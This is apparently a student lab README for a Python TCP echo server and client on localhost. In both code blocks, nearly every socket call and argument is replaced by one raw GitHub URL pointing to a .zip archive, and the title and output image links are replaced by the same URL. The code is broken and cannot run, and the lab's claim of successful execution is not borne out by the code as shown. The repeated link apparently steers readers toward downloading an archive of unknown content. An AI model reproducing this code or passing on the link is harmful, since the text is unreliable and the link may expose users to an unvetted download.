# https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip FOR ECHO CLIENT AND ECHO SERVER USING TCP SOCKETS
## NAME :YUGABHARATHI M
## REGISTER NO:212224230314
# AIM
To write a python program for creating Echo Client and Echo Server using TCP
Sockets Links.
## ALGORITHM:
1. Import the necessary modules in python
2. Create a socket connection to using the socket module.
3. Send message to the client and receive the message from the client using the Socket module in
 server .
4. Send and receive the message using the send function in socket.
## PROGRAM

### server:
```python
import socket

HOST = '127.0.0.1'  
PORT = 65432        

with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip) as server_socket:
    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip((HOST, PORT))
    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip()

    print(f"Server is listening on {HOST}:{PORT}")
    while True:
        conn, addr = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip()
        with conn:
            print(f"Connected by {addr}")
            while True:
                data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(1024)
                if not data:
                    break
                https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(data)
                print(f"Echoed: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8')}")
```

### client:
```python

import socket

HOST = '127.0.0.1'  
PORT = 65432  

with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip) as client_socket:
    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip((HOST, PORT))

    message = 'Hello, Server!'
    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8'))

    data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(1024)
    print(f"Received echo: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8')}")
```

## OUPUT

![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip)

![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip)


## RESULT
Thus, the python program for creating Echo Client and Echo Server using TCP Sockets Links 
was successfully created and executed.
